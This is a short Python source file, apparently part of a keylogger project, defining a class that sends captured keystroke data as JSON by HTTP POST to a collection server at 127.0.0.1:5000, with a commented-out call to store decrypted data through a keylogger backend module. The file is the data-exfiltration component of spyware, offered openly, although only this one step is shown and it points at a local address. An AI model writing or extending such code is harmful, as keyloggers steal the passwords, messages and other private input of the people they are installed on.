from keyloggerBackend.insert_data import save_decrypted_data
import requests
class WriterKeyloggerToNetwork:
    def write(self, keylogger_data):
        requests.post("http://127.0.0.1:5000", json=keylogger_data)
        # save_decrypted_data(keylogger_data)

